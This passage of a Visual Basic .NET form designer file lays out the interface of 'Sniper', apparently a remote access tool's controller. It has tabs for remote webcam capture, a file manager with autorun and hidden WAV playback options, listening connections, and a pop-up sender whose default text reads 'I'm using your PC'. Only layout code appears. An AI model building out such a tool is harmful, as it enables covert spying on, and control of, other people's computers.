        Me.DeleteFileToolStripMenuItem.Image = Global.Sniper.My.Resources.Resources._1299525427_file_delete
        Me.DeleteFileToolStripMenuItem.Name = "DeleteFileToolStripMenuItem"
        Me.DeleteFileToolStripMenuItem.Size = New System.Drawing.Size(244, 22)
        Me.DeleteFileToolStripMenuItem.Text = "Delete file"
        '
        'DeleteEmptyFolderToolStripMenuItem
        '
        Me.DeleteEmptyFolderToolStripMenuItem.Image = Global.Sniper.My.Resources.Resources._1299525627_Folder_Delete
        Me.DeleteEmptyFolderToolStripMenuItem.Name = "DeleteEmptyFolderToolStripMenuItem"
        Me.DeleteEmptyFolderToolStripMenuItem.Size = New System.Drawing.Size(244, 22)
        Me.DeleteEmptyFolderToolStripMenuItem.Text = "Delete empty folder"
        '
        'RenameFileToolStripMenuItem
        '
        Me.RenameFileToolStripMenuItem.Image = Global.Sniper.My.Resources.Resources._1299528532_Rename
        Me.RenameFileToolStripMenuItem.Name = "RenameFileToolStripMenuItem"
        Me.RenameFileToolStripMenuItem.Size = New System.Drawing.Size(244, 22)
        Me.RenameFileToolStripMenuItem.Text = "Rename file"
        '
        'RenameFolderToolStripMenuItem
        '
        Me.RenameFolderToolStripMenuItem.Image = Global.Sniper.My.Resources.Resources._1299528532_Rename1
        Me.RenameFolderToolStripMenuItem.Name = "RenameFolderToolStripMenuItem"
        Me.RenameFolderToolStripMenuItem.Size = New System.Drawing.Size(244, 22)
        Me.RenameFolderToolStripMenuItem.Text = "Rename folder"
        '
        'StartFileToolStripMenuItem
        '
        Me.StartFileToolStripMenuItem.Image = Global.Sniper.My.Resources.Resources._1299698298_start
        Me.StartFileToolStripMenuItem.Name = "StartFileToolStripMenuItem"
        Me.StartFileToolStripMenuItem.Size = New System.Drawing.Size(244, 22)
        Me.StartFileToolStripMenuItem.Text = " Start file/folder"
        '
        'CopyToolStripMenuItem
        '
        Me.CopyToolStripMenuItem.Image = Global.Sniper.My.Resources.Resources._1299702441_editcopy
        Me.CopyToolStripMenuItem.Name = "CopyToolStripMenuItem"
        Me.CopyToolStripMenuItem.Size = New System.Drawing.Size(244, 22)
        Me.CopyToolStripMenuItem.Text = "Cut"
        '
        'PasteToolStripMenuItem
        '
        Me.PasteToolStripMenuItem.Image = Global.Sniper.My.Resources.Resources._1299702464_edit_paste
        Me.PasteToolStripMenuItem.Name = "PasteToolStripMenuItem"
        Me.PasteToolStripMenuItem.Size = New System.Drawing.Size(244, 22)
        Me.PasteToolStripMenuItem.Text = "Paste"
        '
        'MakeANewFolderToolStripMenuItem
        '
        Me.MakeANewFolderToolStripMenuItem.Image = Global.Sniper.My.Resources.Resources._1299698356_icontexto_aurora_folders_open
        Me.MakeANewFolderToolStripMenuItem.Name = "MakeANewFolderToolStripMenuItem"
        Me.MakeANewFolderToolStripMenuItem.Size = New System.Drawing.Size(244, 22)
        Me.MakeANewFolderToolStripMenuItem.Text = "Make a new folder"
        '
        'ToolStripSeparator1
        '
        Me.ToolStripSeparator1.Name = "ToolStripSeparator1"
        Me.ToolStripSeparator1.Size = New System.Drawing.Size(241, 6)
        '
        'AddToDownloadListToolStripMenuItem
        '
        Me.AddToDownloadListToolStripMenuItem.Image = Global.Sniper.My.Resources.Resources._1299786608_10
        Me.AddToDownloadListToolStripMenuItem.Name = "AddToDownloadListToolStripMenuItem"
        Me.AddToDownloadListToolStripMenuItem.Size = New System.Drawing.Size(244, 22)
        Me.AddToDownloadListToolStripMenuItem.Text = "Add in download in progress list"
        '
        'AddInUploadInProgressListToolStripMenuItem
        '
        Me.AddInUploadInProgressListToolStripMenuItem.Image = Global.Sniper.My.Resources.Resources._1299786658_parcel
        Me.AddInUploadInProgressListToolStripMenuItem.Name = "AddInUploadInProgressListToolStripMenuItem"
        Me.AddInUploadInProgressListToolStripMenuItem.Size = New System.Drawing.Size(244, 22)
        Me.AddInUploadInProgressListToolStripMenuItem.Text = "Add in upload in progress list"
        '
        'SetAsWallpaperToolStripMenuItem
        '
        Me.SetAsWallpaperToolStripMenuItem.Image = Global.Sniper.My.Resources.Resources._1301338949_screen
        Me.SetAsWallpaperToolStripMenuItem.Name = "SetAsWallpaperToolStripMenuItem"
        Me.SetAsWallpaperToolStripMenuItem.Size = New System.Drawing.Size(244, 22)
        Me.SetAsWallpaperToolStripMenuItem.Text = "Set as wallpaper"
        '
        'StartWavFileToolStripMenuItem
        '
        Me.StartWavFileToolStripMenuItem.Image = Global.Sniper.My.Resources.Resources._1299698298_start
        Me.StartWavFileToolStripMenuItem.Name = "StartWavFileToolStripMenuItem"
        Me.StartWavFileToolStripMenuItem.Size = New System.Drawing.Size(244, 22)
        Me.StartWavFileToolStripMenuItem.Text = "Play WAV file hidden"
        '
        'AddFileInAutorunFolderToolStripMenuItem
        '
        Me.AddFileInAutorunFolderToolStripMenuItem.Image = Global.Sniper.My.Resources.Resources._1303247350_tick_circle
        Me.AddFileInAutorunFolderToolStripMenuItem.Name = "AddFileInAutorunFolderToolStripMenuItem"
        Me.AddFileInAutorunFolderToolStripMenuItem.Size = New System.Drawing.Size(244, 22)
        Me.AddFileInAutorunFolderToolStripMenuItem.Text = "Add file in autorun folder"
        '
        'cxmstrPoSch
        '
        Me.cxmstrPoSch.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.StartListeningToolStripMenuItem, Me.CloseConnectionToolStripMenuItem})
        Me.cxmstrPoSch.Name = "cxmstrPoSch"
        Me.cxmstrPoSch.Size = New System.Drawing.Size(167, 48)
        '
        'StartListeningToolStripMenuItem
        '
        Me.StartListeningToolStripMenuItem.Image = Global.Sniper.My.Resources.Resources._1300106901_312
        Me.StartListeningToolStripMenuItem.Name = "StartListeningToolStripMenuItem"
        Me.StartListeningToolStripMenuItem.Size = New System.Drawing.Size(166, 22)
        Me.StartListeningToolStripMenuItem.Text = "Start listening"
        '
        'CloseConnectionToolStripMenuItem
        '
        Me.CloseConnectionToolStripMenuItem.Image = Global.Sniper.My.Resources.Resources._1300106922_close
        Me.CloseConnectionToolStripMenuItem.Name = "CloseConnectionToolStripMenuItem"
        Me.CloseConnectionToolStripMenuItem.Size = New System.Drawing.Size(166, 22)
        Me.CloseConnectionToolStripMenuItem.Text = "Close connection"
        '
        'cxmstrPoDow
        '
        Me.cxmstrPoDow.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.StartListeningToolStripMenuItem1, Me.CloseConnectionToolStripMenuItem1})
        Me.cxmstrPoDow.Name = "cxmstrPoDow"
        Me.cxmstrPoDow.Size = New System.Drawing.Size(167, 48)
        '
        'StartListeningToolStripMenuItem1
        '
        Me.StartListeningToolStripMenuItem1.Image = Global.Sniper.My.Resources.Resources._1300106901_312
        Me.StartListeningToolStripMenuItem1.Name = "StartListeningToolStripMenuItem1"
        Me.StartListeningToolStripMenuItem1.Size = New System.Drawing.Size(166, 22)
        Me.StartListeningToolStripMenuItem1.Text = "Start listening"
        '
        'CloseConnectionToolStripMenuItem1
        '
        Me.CloseConnectionToolStripMenuItem1.Image = Global.Sniper.My.Resources.Resources._1300106922_close
        Me.CloseConnectionToolStripMenuItem1.Name = "CloseConnectionToolStripMenuItem1"
        Me.CloseConnectionToolStripMenuItem1.Size = New System.Drawing.Size(166, 22)
        Me.CloseConnectionToolStripMenuItem1.Text = "Close connection"
        '
        'tmrPannDow
        '
        Me.tmrPannDow.Interval = 1
        '
        'tmrDatiDow
        '
        Me.tmrDatiDow.Interval = 1
        '
        'cxmstrDow
        '
        Me.cxmstrDow.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.RemoveFromTheListToolStripMenuItem})
        Me.cxmstrDow.Name = "cxmstrDow"
        Me.cxmstrDow.Size = New System.Drawing.Size(204, 26)
        '
        'RemoveFromTheListToolStripMenuItem
        '
        Me.RemoveFromTheListToolStripMenuItem.Image = Global.Sniper.My.Resources.Resources._1299525427_file_delete
        Me.RemoveFromTheListToolStripMenuItem.Name = "RemoveFromTheListToolStripMenuItem"
        Me.RemoveFromTheListToolStripMenuItem.Size = New System.Drawing.Size(203, 22)
        Me.RemoveFromTheListToolStripMenuItem.Text = "Remove file from the list"
        '
        'tmrPannUp
        '
        Me.tmrPannUp.Interval = 1
        '
        'tmrDatiUp
        '
        Me.tmrDatiUp.Interval = 1
        '
        'cxmstrPoUp
        '
        Me.cxmstrPoUp.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.StartToolStripMenuItem, Me.CloseConnectionToolStripMenuItem2})
        Me.cxmstrPoUp.Name = "cxmstrPoUp"
        Me.cxmstrPoUp.Size = New System.Drawing.Size(167, 48)
        '
        'StartToolStripMenuItem
        '
        Me.StartToolStripMenuItem.Image = Global.Sniper.My.Resources.Resources._1300106901_312
        Me.StartToolStripMenuItem.Name = "StartToolStripMenuItem"
        Me.StartToolStripMenuItem.Size = New System.Drawing.Size(166, 22)
        Me.StartToolStripMenuItem.Text = "Start listening"
        '
        'CloseConnectionToolStripMenuItem2
        '
        Me.CloseConnectionToolStripMenuItem2.Image = Global.Sniper.My.Resources.Resources._1300106922_close
        Me.CloseConnectionToolStripMenuItem2.Name = "CloseConnectionToolStripMenuItem2"
        Me.CloseConnectionToolStripMenuItem2.Size = New System.Drawing.Size(166, 22)
        Me.CloseConnectionToolStripMenuItem2.Text = "Close connection"
        '
        'cxmstrUp
        '
        Me.cxmstrUp.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.RemoveFileFromTheListToolStripMenuItem})
        Me.cxmstrUp.Name = "cxmstrUp"
        Me.cxmstrUp.Size = New System.Drawing.Size(204, 26)
        '
        'RemoveFileFromTheListToolStripMenuItem
        '
        Me.RemoveFileFromTheListToolStripMenuItem.Image = Global.Sniper.My.Resources.Resources._1299525427_file_delete
        Me.RemoveFileFromTheListToolStripMenuItem.Name = "RemoveFileFromTheListToolStripMenuItem"
        Me.RemoveFileFromTheListToolStripMenuItem.Size = New System.Drawing.Size(203, 22)
        Me.RemoveFileFromTheListToolStripMenuItem.Text = "Remove file from the list"
        '
        'tbpWebc
        '
        Me.tbpWebc.BackColor = System.Drawing.SystemColors.Control
        Me.tbpWebc.Controls.Add(Me.chkImmSizeW)
        Me.tbpWebc.Controls.Add(Me.cmdOpImmW)
        Me.tbpWebc.Controls.Add(Me.grpQuImm)
        Me.tbpWebc.Controls.Add(Me.lblkbWeb)
        Me.tbpWebc.Controls.Add(Me.prgDatiWeb)
        Me.tbpWebc.Controls.Add(Me.cmdGTW)
        Me.tbpWebc.Controls.Add(Me.combDri)
        Me.tbpWebc.Controls.Add(Me.lblDrivAV)
        Me.tbpWebc.Controls.Add(Me.picBanWeb)
        Me.tbpWebc.Location = New System.Drawing.Point(4, 22)
        Me.tbpWebc.Name = "tbpWebc"
        Me.tbpWebc.Size = New System.Drawing.Size(544, 460)
        Me.tbpWebc.TabIndex = 4
        Me.tbpWebc.Text = "Webcam"
        '
        'chkImmSizeW
        '
        Me.chkImmSizeW.AutoSize = True
        Me.chkImmSizeW.Enabled = False
        Me.chkImmSizeW.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.chkImmSizeW.ForeColor = System.Drawing.Color.Red
        Me.chkImmSizeW.Location = New System.Drawing.Point(192, 195)
        Me.chkImmSizeW.Name = "chkImmSizeW"
        Me.chkImmSizeW.Size = New System.Drawing.Size(182, 17)
        Me.chkImmSizeW.TabIndex = 8
        Me.chkImmSizeW.Text = "Fit the image to the window"
        Me.chkImmSizeW.UseVisualStyleBackColor = True
        '
        'cmdOpImmW
        '
        Me.cmdOpImmW.Font = New System.Drawing.Font("Microsoft Sans Serif", 12.0!, CType((System.Drawing.FontStyle.Bold Or System.Drawing.FontStyle.Underline), System.Drawing.FontStyle), System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.cmdOpImmW.Location = New System.Drawing.Point(169, 218)
        Me.cmdOpImmW.Name = "cmdOpImmW"
        Me.cmdOpImmW.Size = New System.Drawing.Size(225, 57)
        Me.cmdOpImmW.TabIndex = 6
        Me.cmdOpImmW.Text = "Open image receiver"
        Me.cmdOpImmW.UseVisualStyleBackColor = True
        '
        'grpQuImm
        '
        Me.grpQuImm.Controls.Add(Me.cmdRIMMW)
        Me.grpQuImm.Controls.Add(Me.lblPerW)
        Me.grpQuImm.Controls.Add(Me.cmdSetPerW)
        Me.grpQuImm.Controls.Add(Me.lblQuaW)
        Me.grpQuImm.Controls.Add(Me.nudQW)
        Me.grpQuImm.Controls.Add(Me.cmdSetW)
        Me.grpQuImm.Controls.Add(Me.lblFormWXY)
        Me.grpQuImm.Location = New System.Drawing.Point(10, 75)
        Me.grpQuImm.Name = "grpQuImm"
        Me.grpQuImm.Size = New System.Drawing.Size(528, 97)
        Me.grpQuImm.TabIndex = 5
        Me.grpQuImm.TabStop = False
        Me.grpQuImm.Text = "Images quality"
        '
        'cmdRIMMW
        '
        Me.cmdRIMMW.Location = New System.Drawing.Point(177, 63)
        Me.cmdRIMMW.Name = "cmdRIMMW"
        Me.cmdRIMMW.Size = New System.Drawing.Size(186, 23)
        Me.cmdRIMMW.TabIndex = 6
        Me.cmdRIMMW.Text = "Restore image size"
        Me.cmdRIMMW.UseVisualStyleBackColor = True
        '
        'lblPerW
        '
        Me.lblPerW.AutoSize = True
        Me.lblPerW.Font = New System.Drawing.Font("Microsoft Sans Serif", 9.75!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lblPerW.Location = New System.Drawing.Point(415, 37)
        Me.lblPerW.Name = "lblPerW"
        Me.lblPerW.Size = New System.Drawing.Size(21, 16)
        Me.lblPerW.TabIndex = 5
        Me.lblPerW.Text = "%"
        '
        'cmdSetPerW
        '
        Me.cmdSetPerW.Location = New System.Drawing.Point(446, 34)
        Me.cmdSetPerW.Name = "cmdSetPerW"
        Me.cmdSetPerW.Size = New System.Drawing.Size(75, 23)
        Me.cmdSetPerW.TabIndex = 4
        Me.cmdSetPerW.Text = "Set"
        Me.cmdSetPerW.UseVisualStyleBackColor = True
        '
        'lblQuaW
        '
        Me.lblQuaW.AutoSize = True
        Me.lblQuaW.Location = New System.Drawing.Point(272, 39)
        Me.lblQuaW.Name = "lblQuaW"
        Me.lblQuaW.Size = New System.Drawing.Size(42, 13)
        Me.lblQuaW.TabIndex = 3
        Me.lblQuaW.Text = "Quality:"
        '
        'nudQW
        '
        Me.nudQW.Location = New System.Drawing.Point(320, 37)
        Me.nudQW.Name = "nudQW"
        Me.nudQW.Size = New System.Drawing.Size(89, 20)
        Me.nudQW.TabIndex = 2
        Me.nudQW.Value = New Decimal(New Integer() {30, 0, 0, 0})
        '
        'cmdSetW
        '
        Me.cmdSetW.Location = New System.Drawing.Point(6, 34)
        Me.cmdSetW.Name = "cmdSetW"
        Me.cmdSetW.Size = New System.Drawing.Size(153, 23)
        Me.cmdSetW.TabIndex = 1
        Me.cmdSetW.Text = "Set image as window size"
        Me.cmdSetW.UseVisualStyleBackColor = True
        '
        'lblFormWXY
        '
        Me.lblFormWXY.AutoSize = True
        Me.lblFormWXY.Location = New System.Drawing.Point(165, 39)
        Me.lblFormWXY.Name = "lblFormWXY"
        Me.lblFormWXY.Size = New System.Drawing.Size(45, 13)
        Me.lblFormWXY.TabIndex = 0
        Me.lblFormWXY.Text = "X: 0 Y:0"
        '
        'lblkbWeb
        '
        Me.lblkbWeb.AutoSize = True
        Me.lblkbWeb.Location = New System.Drawing.Point(346, 415)
        Me.lblkbWeb.Name = "lblkbWeb"
        Me.lblkbWeb.Size = New System.Drawing.Size(28, 13)
        Me.lblkbWeb.TabIndex = 4
        Me.lblkbWeb.Text = "0 kb"
        '
        'prgDatiWeb
        '
        Me.prgDatiWeb.Location = New System.Drawing.Point(346, 434)
        Me.prgDatiWeb.Name = "prgDatiWeb"
        Me.prgDatiWeb.Size = New System.Drawing.Size(192, 23)
        Me.prgDatiWeb.TabIndex = 3
        '
        'cmdGTW
        '
        Me.cmdGTW.Location = New System.Drawing.Point(233, 32)
        Me.cmdGTW.Name = "cmdGTW"
        Me.cmdGTW.Size = New System.Drawing.Size(75, 23)
        Me.cmdGTW.TabIndex = 2
        Me.cmdGTW.Text = "Get them"
        Me.cmdGTW.UseVisualStyleBackColor = True
        '
        'combDri
        '
        Me.combDri.FormattingEnabled = True
        Me.combDri.Location = New System.Drawing.Point(10, 34)
        Me.combDri.Name = "combDri"
        Me.combDri.Size = New System.Drawing.Size(217, 21)
        Me.combDri.TabIndex = 1
        '
        'lblDrivAV
        '
        Me.lblDrivAV.AutoSize = True
        Me.lblDrivAV.Location = New System.Drawing.Point(7, 17)
        Me.lblDrivAV.Name = "lblDrivAV"
        Me.lblDrivAV.Size = New System.Drawing.Size(152, 13)
        Me.lblDrivAV.TabIndex = 0
        Me.lblDrivAV.Text = "Select a video capture device:"
        '
        'picBanWeb
        '
        Me.picBanWeb.Image = Global.Sniper.My.Resources.Resources._1302375075_webcam
        Me.picBanWeb.Location = New System.Drawing.Point(10, 330)
        Me.picBanWeb.Name = "picBanWeb"
        Me.picBanWeb.Size = New System.Drawing.Size(133, 127)
        Me.picBanWeb.TabIndex = 7
        Me.picBanWeb.TabStop = False
        '
        'tbcMex
        '
        Me.tbcMex.BackColor = System.Drawing.SystemColors.Control
        Me.tbcMex.Controls.Add(Me.txtLogmex)
        Me.tbcMex.Controls.Add(Me.lblLog)
        Me.tbcMex.Controls.Add(Me.grpInvMex)
        Me.tbcMex.Controls.Add(Me.grpchkDom)
        Me.tbcMex.Controls.Add(Me.grpMT)
        Me.tbcMex.Location = New System.Drawing.Point(4, 22)
        Me.tbcMex.Name = "tbcMex"
        Me.tbcMex.Padding = New System.Windows.Forms.Padding(3)
        Me.tbcMex.Size = New System.Drawing.Size(544, 460)
        Me.tbcMex.TabIndex = 3
        Me.tbcMex.Text = "Message Manager"
        '
        'txtLogmex
        '
        Me.txtLogmex.BackColor = System.Drawing.Color.Black
        Me.txtLogmex.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.txtLogmex.ForeColor = System.Drawing.Color.Lime
        Me.txtLogmex.Location = New System.Drawing.Point(25, 183)
        Me.txtLogmex.Multiline = True
        Me.txtLogmex.Name = "txtLogmex"
        Me.txtLogmex.ReadOnly = True
        Me.txtLogmex.ScrollBars = System.Windows.Forms.ScrollBars.Both
        Me.txtLogmex.Size = New System.Drawing.Size(202, 163)
        Me.txtLogmex.TabIndex = 5
        '
        'lblLog
        '
        Me.lblLog.AutoSize = True
        Me.lblLog.Location = New System.Drawing.Point(23, 159)
        Me.lblLog.Name = "lblLog"
        Me.lblLog.Size = New System.Drawing.Size(28, 13)
        Me.lblLog.TabIndex = 4
        Me.lblLog.Text = "Log:"
        '
        'grpInvMex
        '
        Me.grpInvMex.Controls.Add(Me.cmdCTEMR)
        Me.grpInvMex.Controls.Add(Me.cmdClearlogMex)
        Me.grpInvMex.Controls.Add(Me.cmdSendmex)
        Me.grpInvMex.Controls.Add(Me.cmdTestMex)
        Me.grpInvMex.Controls.Add(Me.txtMess)
        Me.grpInvMex.Controls.Add(Me.lblMex)
        Me.grpInvMex.Controls.Add(Me.txtTitle)
        Me.grpInvMex.Controls.Add(Me.lblTitleMex)
        Me.grpInvMex.Location = New System.Drawing.Point(235, 159)
        Me.grpInvMex.Name = "grpInvMex"
        Me.grpInvMex.Size = New System.Drawing.Size(271, 284)
        Me.grpInvMex.TabIndex = 3
        Me.grpInvMex.TabStop = False
        Me.grpInvMex.Text = "Message settings"
        '
        'cmdCTEMR
        '
        Me.cmdCTEMR.Location = New System.Drawing.Point(13, 223)
        Me.cmdCTEMR.Name = "cmdCTEMR"
        Me.cmdCTEMR.Size = New System.Drawing.Size(155, 23)
        Me.cmdCTEMR.TabIndex = 7
        Me.cmdCTEMR.Text = "Clear title and message"
        Me.cmdCTEMR.UseVisualStyleBackColor = True
        '
        'cmdClearlogMex
        '
        Me.cmdClearlogMex.Location = New System.Drawing.Point(13, 252)
        Me.cmdClearlogMex.Name = "cmdClearlogMex"
        Me.cmdClearlogMex.Size = New System.Drawing.Size(155, 23)
        Me.cmdClearlogMex.TabIndex = 6
        Me.cmdClearlogMex.Text = "Clear log"
        Me.cmdClearlogMex.UseVisualStyleBackColor = True
        '
        'cmdSendmex
        '
        Me.cmdSendmex.Location = New System.Drawing.Point(190, 223)
        Me.cmdSendmex.Name = "cmdSendmex"
        Me.cmdSendmex.Size = New System.Drawing.Size(75, 23)
        Me.cmdSendmex.TabIndex = 5
        Me.cmdSendmex.Text = "Send"
        Me.cmdSendmex.UseVisualStyleBackColor = True
        '
        'cmdTestMex
        '
        Me.cmdTestMex.Location = New System.Drawing.Point(190, 252)
        Me.cmdTestMex.Name = "cmdTestMex"
        Me.cmdTestMex.Size = New System.Drawing.Size(75, 23)
        Me.cmdTestMex.TabIndex = 4
        Me.cmdTestMex.Text = "Test"
        Me.cmdTestMex.UseVisualStyleBackColor = True
        '
        'txtMess
        '
        Me.txtMess.Location = New System.Drawing.Point(13, 81)
        Me.txtMess.Multiline = True
        Me.txtMess.Name = "txtMess"
        Me.txtMess.Size = New System.Drawing.Size(251, 121)
        Me.txtMess.TabIndex = 3
        Me.txtMess.Text = "I'm using your PC. Just for entertaining.."
        '
        'lblMex
        '
        Me.lblMex.AutoSize = True
        Me.lblMex.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lblMex.Location = New System.Drawing.Point(10, 56)
        Me.lblMex.Name = "lblMex"
        Me.lblMex.Size = New System.Drawing.Size(86, 13)
        Me.lblMex.TabIndex = 2
        Me.lblMex.Text = "Message text:"
        '
        'txtTitle
        '
        Me.txtTitle.Location = New System.Drawing.Point(46, 24)
        Me.txtTitle.Name = "txtTitle"
        Me.txtTitle.Size = New System.Drawing.Size(219, 20)
        Me.txtTitle.TabIndex = 1
        Me.txtTitle.Text = "Hello"
        '
        'lblTitleMex
        '
        Me.lblTitleMex.AutoSize = True
        Me.lblTitleMex.Location = New System.Drawing.Point(10, 27)
        Me.lblTitleMex.Name = "lblTitleMex"
        Me.lblTitleMex.Size = New System.Drawing.Size(30, 13)
        Me.lblTitleMex.TabIndex = 0
        Me.lblTitleMex.Text = "Title:"
        '
        'grpchkDom
        '
        Me.grpchkDom.Controls.Add(Me.rbutYNI)
        Me.grpchkDom.Controls.Add(Me.rbutYNC)
        Me.grpchkDom.Controls.Add(Me.rbutYN)
        Me.grpchkDom.Enabled = False
        Me.grpchkDom.Location = New System.Drawing.Point(26, 352)
        Me.grpchkDom.Name = "grpchkDom"
        Me.grpchkDom.Size = New System.Drawing.Size(203, 91)
        Me.grpchkDom.TabIndex = 2
        Me.grpchkDom.TabStop = False
        Me.grpchkDom.Text = "Button on the question message"
        '
        'rbutYNI
        '
        Me.rbutYNI.AutoSize = True
        Me.rbutYNI.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.rbutYNI.Location = New System.Drawing.Point(6, 65)
        Me.rbutYNI.Name = "rbutYNI"
        Me.rbutYNI.Size = New System.Drawing.Size(122, 17)
        Me.rbutYNI.TabIndex = 2
        Me.rbutYNI.Text = "Retry and cancel"
        Me.rbutYNI.UseVisualStyleBackColor = True
        '
        'rbutYNC
        '
        Me.rbutYNC.AutoSize = True
        Me.rbutYNC.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.rbutYNC.Location = New System.Drawing.Point(6, 42)
        Me.rbutYNC.Name = "rbutYNC"
        Me.rbutYNC.Size = New System.Drawing.Size(135, 17)
        Me.rbutYNC.TabIndex = 1
        Me.rbutYNC.Text = "Yes, no and cancel"
        Me.rbutYNC.UseVisualStyleBackColor = True
        '
        'rbutYN
        '
        Me.rbutYN.AutoSize = True
        Me.rbutYN.Checked = True
        Me.rbutYN.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.rbutYN.Location = New System.Drawing.Point(6, 19)
        Me.rbutYN.Name = "rbutYN"
        Me.rbutYN.Size = New System.Drawing.Size(89, 17)
        Me.rbutYN.TabIndex = 0
        Me.rbutYN.TabStop = True
        Me.rbutYN.Text = "Yes and no"
        Me.rbutYN.UseVisualStyleBackColor = True
        '
        'grpMT
        '
        Me.grpMT.Controls.Add(Me.lblMStyle)
        Me.grpMT.Controls.Add(Me.lblSSB)
        Me.grpMT.Controls.Add(Me.cmdNothg)
        Me.grpMT.Controls.Add(Me.cmdDom)
        Me.grpMT.Controls.Add(Me.cmdWa)
        Me.grpMT.Controls.Add(Me.cmdEr)
        Me.grpMT.Controls.Add(Me.cmdInfo)
        Me.grpMT.Location = New System.Drawing.Point(25, 21)
        Me.grpMT.Name = "grpMT"
        Me.grpMT.Size = New System.Drawing.Size(481, 132)
        Me.grpMT.TabIndex = 1
        Me.grpMT.TabStop = False
        Me.grpMT.Text = "Message type"
        '
        'lblMStyle
        '
        Me.lblMStyle.AutoSize = True
        Me.lblMStyle.Font = New System.Drawing.Font("Microsoft Sans Serif", 12.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lblMStyle.ForeColor = System.Drawing.Color.Blue
        Me.lblMStyle.Location = New System.Drawing.Point(132, 99)
        Me.lblMStyle.Name = "lblMStyle"
        Me.lblMStyle.Size = New System.Drawing.Size(71, 20)
        Me.lblMStyle.TabIndex = 7
        Me.lblMStyle.Text = "Nothing"
        '
        'lblSSB
        '
        Me.lblSSB.AutoSize = True
        Me.lblSSB.Font = New System.Drawing.Font("Microsoft Sans Serif", 9.75!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lblSSB.Location = New System.Drawing.Point(19, 103)
        Me.lblSSB.Name = "lblSSB"
        Me.lblSSB.Size = New System.Drawing.Size(111, 16)
        Me.lblSSB.TabIndex = 6
        Me.lblSSB.Text = "Selected style:"
        '
        'cmdNothg
        '
        Me.cmdNothg.Location = New System.Drawing.Point(23, 19)
        Me.cmdNothg.Name = "cmdNothg"
        Me.cmdNothg.Size = New System.Drawing.Size(74, 61)
        Me.cmdNothg.TabIndex = 5
        Me.cmdNothg.Text = "Nothing"
        Me.cmdNothg.UseVisualStyleBackColor = True
        '
        'cmdDom
        '
        Me.cmdDom.Image = Global.Sniper.My.Resources.Resources._1301605515_Help1
        Me.cmdDom.Location = New System.Drawing.Point(346, 19)
        Me.cmdDom.Name = "cmdDom"
        Me.cmdDom.Size = New System.Drawing.Size(112, 61)
        Me.cmdDom.TabIndex = 4
        Me.cmdDom.UseVisualStyleBackColor = True
        '
        'cmdWa
        '
        Me.cmdWa.Image = Global.Sniper.My.Resources.Resources._1301605492_alert
        Me.cmdWa.Location = New System.Drawing.Point(264, 19)
        Me.cmdWa.Name = "cmdWa"
        Me.cmdWa.Size = New System.Drawing.Size(74, 61)
        Me.cmdWa.TabIndex = 3
        Me.cmdWa.UseVisualStyleBackColor = True
        '
        'cmdEr
        '
        Me.cmdEr.Image = Global.Sniper.My.Resources.Resources._1301605527_Error
        Me.cmdEr.Location = New System.Drawing.Point(185, 19)
        Me.cmdEr.Name = "cmdEr"
        Me.cmdEr.Size = New System.Drawing.Size(74, 61)
        Me.cmdEr.TabIndex = 2
        Me.cmdEr.UseVisualStyleBackColor = True
        '
        'cmdInfo
        '
        Me.cmdInfo.Image = Global.Sniper.My.Resources.Resources._1301605477_Information
        Me.cmdInfo.Location = New System.Drawing.Point(105, 19)
        Me.cmdInfo.Name = "cmdInfo"
        Me.cmdInfo.Size = New System.Drawing.Size(74, 61)
        Me.cmdInfo.TabIndex = 1
        Me.cmdInfo.UseVisualStyleBackColor = True
        '
        'tbpFileMan
        '
        Me.tbpFileMan.BackColor = System.Drawing.SystemColors.Control
        Me.tbpFileMan.Controls.Add(Me.tbcFilesDDU)
        Me.tbpFileMan.Location = New System.Drawing.Point(4, 22)
        Me.tbpFileMan.Name = "tbpFileMan"
        Me.tbpFileMan.Padding = New System.Windows.Forms.Padding(3)
        Me.tbpFileMan.Size = New System.Drawing.Size(544, 460)
        Me.tbpFileMan.TabIndex = 2
        Me.tbpFileMan.Text = "File manager"
        '
        'tbcFilesDDU
        '
        Me.tbcFilesDDU.Controls.Add(Me.tbpFD)
        Me.tbcFilesDDU.Controls.Add(Me.tbpDAUIP)
        Me.tbcFilesDDU.Location = New System.Drawing.Point(7, 7)
        Me.tbcFilesDDU.Name = "tbcFilesDDU"
        Me.tbcFilesDDU.SelectedIndex = 0
        Me.tbcFilesDDU.Size = New System.Drawing.Size(531, 447)
        Me.tbcFilesDDU.TabIndex = 0
        '
        'tbpFD
        '
        Me.tbpFD.BackColor = System.Drawing.SystemColors.Control
        Me.tbpFD.Controls.Add(Me.txtPath)
        Me.tbpFD.Controls.Add(Me.cmdGetDr)
        Me.tbpFD.Controls.Add(Me.lblInfoFD)
        Me.tbpFD.Controls.Add(Me.chkModListFD)
        Me.tbpFD.Controls.Add(Me.cmdCCListFD)
        Me.tbpFD.Controls.Add(Me.lstwFileFolderR)
        Me.tbpFD.Location = New System.Drawing.Point(4, 22)
        Me.tbpFD.Name = "tbpFD"
        Me.tbpFD.Padding = New System.Windows.Forms.Padding(3)
        Me.tbpFD.Size = New System.Drawing.Size(523, 421)
        Me.tbpFD.TabIndex = 0
        Me.tbpFD.Text = "File and Dir"
